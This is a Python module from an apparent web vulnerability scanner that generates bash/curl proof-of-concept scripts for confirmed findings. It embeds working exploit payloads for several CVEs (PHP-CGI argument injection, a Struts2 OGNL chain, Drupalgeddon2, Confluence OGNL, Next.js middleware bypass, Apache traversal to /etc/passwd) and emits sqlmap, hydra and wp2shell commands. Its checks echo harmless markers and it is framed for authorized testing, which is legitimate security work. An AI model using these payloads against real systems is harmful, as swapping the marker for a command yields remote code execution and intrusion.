"""Reproduction-script generator: a confirmed finding -> a runnable benign PoC.

For every finding the pipeline confirmed, emit a standalone bash+curl script that
re-triggers the SAME safe-check oracle (reflected marker / arithmetic / passwd /
status flip) — so you can replay it in a demo, verify it later, or drop it into a
report. Scripts are benign by construction (no OS command, no state change), the
same way the scanner proved it.
"""
from __future__ import annotations

from urllib.parse import urlparse

# php-cgi-Injector CVE-2024-4577 payload group 1 (best-fit %ADd -> -d ...)
PHPCGI_PAYLOAD = (
    "%ADd+disable_functions%3d%26+%ADd+disable_classes%3d%26+%ADd+open_basedir%3d"
    "+%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1"
    "+%ADd+allow_url_fopen%3d1+%ADd+auto_prepend_file%3dphp://input"
)
# Struts2 S2-045 arithmetic-in-header safe check (no OS command)
STRUTS_OGNL = (
    "%{(#nike='multipart/form-data')."
    "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    "(#_memberAccess?(#_memberAccess=#dm):"
    "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    "(#ognlUtil.getExcludedPackageNames().clear())."
    "(#ognlUtil.getExcludedClasses().clear())."
    "(#context.setMemberAccess(#dm))))."
    "(#res=@org.apache.struts2.ServletActionContext@getResponse())."
    "(#res.setHeader('X-Edurecon-Chk',''+(8675*3)))}"
)


def _hdr():
    return ("#!/usr/bin/env bash\n"
            "# edu-recon reproduction PoC — benign safe-check, no OS command / no state change.\n"
            "# AUTHORIZED TARGETS ONLY.\nset -u\n")


def _root(url: str) -> str:
    u = urlparse(url)
    return f"{u.scheme}://{u.netloc}"


def script_for(f: dict) -> dict:
    ev = f.get("evidence", {}) or {}
    cve = ev.get("cve", "")
    cat = f.get("category", "")
    url = ev.get("url", "")
    title = f.get("title", "")
    body = ""
    expect = ""

    if cve in ("CVE-2024-4577", "CVE-2024-8926"):
        cgi = ev.get("cgipoint", "/php-cgi/php-cgi.exe")
        base = url.rstrip("/")
        full = f"{base}{cgi}?{PHPCGI_PAYLOAD}"
        body = (f"URL='{full}'\n"
                "MARK=EDURECON_$RANDOM$RANDOM\n"
                "curl -sk -X POST \"$URL\" -H 'Content-Type: application/x-www-form-urlencoded' "
                "--data-binary \"<?php echo '$MARK'; die(); ?>\" | grep -q \"$MARK\" "
                "&& echo '[+] VULNERABLE (marker echoed)' || echo '[-] not vulnerable'\n")
        expect = "回應含 MARK => best-fit %ADd 生效、auto_prepend_file 執行了 body"

    elif cve == "CVE-2017-9841":
        body = (f"URL='{url}'\nMARK=EDURECON_$RANDOM$RANDOM\n"
                "curl -sk -X POST \"$URL\" -H 'Content-Type: text/plain' "
                "--data \"<?php echo '$MARK'; ?>\" | grep -q \"$MARK\" "
                "&& echo '[+] VULNERABLE' || echo '[-] no'\n")
        expect = "PHPUnit eval-stdin 回顯 MARK"

    elif cve == "CVE-2021-41773":
        body = (f"URL='{url}'\n"
                "curl -sk \"$URL\" | grep -E 'root:.*:0:0:' "
                "&& echo '[+] VULNERABLE (/etc/passwd)' || echo '[-] no'\n")
        expect = "回應含 root:...:0:0:  (Apache 2.4.49 穿越 → LFI)"

    elif cve == "CVE-2017-5638":
        body = (f"URL='{_root(url)}/'\n"
                f"curl -sk -D - -o /dev/null \"$URL\" -H \"Content-Type: {STRUTS_OGNL}\" "
                "| grep -i 'X-Edurecon-Chk: 26025' "
                "&& echo '[+] VULNERABLE (OGNL eval 8675*3=26025)' || echo '[-] no'\n")
        expect = "回應 header X-Edurecon-Chk: 26025"

    elif cve == "CVE-2022-26134":
        base = url.split("/%24%7B")[0] if "/%24%7B" in url else _root(url)
        body = (f"BASE='{base}'\n"
                "curl -ski \"$BASE/%24%7B173*173%7D/\" | grep -iE 'Location:.*29929' "
                "&& echo '[+] VULNERABLE (OGNL 173*173=29929)' || echo '[-] no'\n")
        expect = "302 Location 含 29929"

    elif cve == "CVE-2018-7600":
        body = (f"URL='{url}'\nMARK=EDURECON_$RANDOM$RANDOM\n"
                "curl -sk -X POST \"$URL\" "
                "--data 'form_id=user_register_form&_drupal_ajax=1"
                "&mail%5B%23post_render%5D%5B%5D=printf&mail%5B%23type%5D=markup"
                "&mail%5B%23markup%5D='\"$MARK\" | grep -q \"$MARK\" "
                "&& echo '[+] VULNERABLE (Drupalgeddon2)' || echo '[-] no'\n")
        expect = "AJAX 回應回顯 MARK (form-API #post_render 執行 printf)"

    elif cve == "CVE-2025-29927":
        body = (f"URL='{url}'\n"
                "A=$(curl -sk -o /dev/null -w '%{http_code}' \"$URL\")\n"
                "B=$(curl -sk -o /dev/null -w '%{http_code}' \"$URL\" "
                "-H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware')\n"
                "echo \"without=$A with=$B\"; [ \"$B\" = 200 ] && [ \"$A\" != 200 ] "
                "&& echo '[+] VULNERABLE (middleware bypass)' || echo '[-] no'\n")
        expect = "加 header 後從 3xx/401 變 200"

    elif cve == "CVE-2025-55182":
        rep = ev.get("reproduce", "")
        body = f"# 用工具重現(safe-check):\n{rep or 'python react2shell-scanner.py -t ' + _root(url) + ' --safe-check'}\n"
        expect = "scanner 回報 SAFE_CHECK_OK"

    elif cat in ("vcs-leak",) and "/.git" in url:
        body = (f"# 重建外露 .git 原始碼(用 edu-recon 內建 dumper 或 git-dumper):\n"
                f"curl -sk '{url}'   # {url.split('/.git')[0]}/.git 外露\n")
        expect = "回應 .git 內容 → 可重建原始碼(見 web UI 的 ⤓ Dump .git)"

    elif cat in ("secret-leak", "backup-leak", "info-leak", "api-leak", "admin-panel", "dir-listing"):
        body = f"curl -sk '{url}'   # 直接取回外露資源\n"
        expect = "回應即洩漏內容"

    elif cat == "sqli":
        body = f"sqlmap -u '{url}' --batch --random-agent --level 2 --risk 1\n"
        expect = "sqlmap 確認注入點"

    elif cat == "xss":
        body = f"dalfox url '{url}' --only-poc\n"
        expect = "反射點 PoC"

    elif cat == "weak-cred":
        svc = ev.get("service", ""); port = ev.get("port", "")
        body = (f"# {svc}:{port} 弱憑證;用你的字典重跑:\n"
                f"hydra -C creds.txt -s {port} {f.get('target','')} {svc}\n")
        expect = "hydra 命中登入"

    elif cat == "wordpress":
        body = (f"# WordPress:用 wp2shell 重跑(--json 非互動):\n"
                f"python wp2shell.py {urlparse(url or '').netloc or f.get('target','')} --json\n")
        expect = "wp2shell 回報可利用"

    else:
        body = f"curl -sk '{url}'\n" if url else "# 無可自動化重現步驟;見 evidence。\n"
        expect = ev.get("note", "")

    script = (_hdr()
              + f"# {title}\n"
              + (f"# CVE: {cve}\n" if cve else "")
              + f"# target: {f.get('target','')}  severity: {f.get('severity','')}\n"
              + (f"# expect: {expect}\n" if expect else "")
              + "\n" + body)
    slug = (cve or cat or "poc").lower().replace(" ", "_")
    return {"id": f.get("id", ""), "cve": cve, "category": cat,
            "title": title, "target": f.get("target", ""),
            "severity": f.get("severity", ""), "expect": expect,
            "filename": f"repro_{slug}_{f.get('id','')[:8]}.sh", "script": script}


def _is_confirmed(f: dict) -> bool:
    if f.get("false_positive"):
        return False
    return (f.get("category") == "cve"
            or (f.get("confidence") in ("confirmed", "high")
                and f.get("severity") in ("critical", "high"))
            or f.get("category") in ("secret-leak", "vcs-leak", "backup-leak",
                                     "admin-panel", "dir-listing", "weak-cred"))


def scripts_for_run(run: dict) -> list[dict]:
    out = []
    for t in run.get("targets", []):
        host = t.get("host", "")
        for f in t.get("findings", []):
            if _is_confirmed(f):
                g = dict(f)
                g.setdefault("target", host)
                s = script_for(g)
                out.append(s)
    return out
